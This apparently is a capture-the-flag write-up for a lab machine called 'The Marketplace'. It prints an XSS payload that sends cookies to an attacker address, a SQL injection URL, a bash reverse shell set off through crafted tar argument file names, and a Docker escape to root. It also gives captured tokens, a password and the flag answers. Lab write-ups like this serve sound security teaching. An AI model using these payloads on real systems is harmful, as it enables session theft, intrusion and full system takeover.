# The Marketplace

> Oct 23, 2020 | John Hammond

-----------------------------

Looks like you can create an account.


You can create a new listing, and try XSS

Both work.

XSS to get a cookie:

```
<img src="#" onerror="document.location='http://10.2.2.132:8000/?c='+document.cookie">
```

Got the admin cookie:

```
10.10.218.165 - - [23/Oct/2020 18:25:09] "GET /?c=token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ1c2VySWQiOjIsInVzZXJuYW1lIjoibWljaGFlbCIsImFkbWluIjp0cnVlLCJpYXQiOjE2MDM0OTE5MDd9.XYS-w8vlcxgyaf9DfqRvGTgD_7JRrQTrxwIXj6EhtN4 HTTP/1.1" 200 -
```

Now logging in with the admin account we can find the flag.

# What is flag 1?

```
THM{c37a63895910e478f28669b048c348d5}
```

Now in the admin panel you can perform basic SQLi

```
http://10.10.218.165/admin?user=0%20UNION%20SELECT%201,%202,%203,4%20--
```

# What is flag 2? (User.txt)


Performing SQLi you can get the password hashes and messages. In the messages, you can see `jake` has a password set in SSH.

```
@b_ENXkGYUCAv3zJ
```

SSH in and get user.

```
THM{c3648ee7af1369676e3e4b15da6dc0b4}
```

Now for tar privesc:

```
echo "bash -c 'bash -i >& /dev/tcp/10.2.2.132/9999 0>&1'" > shell.sh

echo "" > "--checkpoint=1"
echo "" > "--checkpoint-action=exec=sh shell.sh"
sudo -u michael /opt/backups/backup.sh
```


# What is flag 3? (Root.txt)

Docker privesc

```
docker run -v /:/mnt --rm -it alpine chroot /mnt sh

chmod +s /bin/bash
```


```
THM{d4f76179c80c0dcf46e0f8e43c9abd62}
```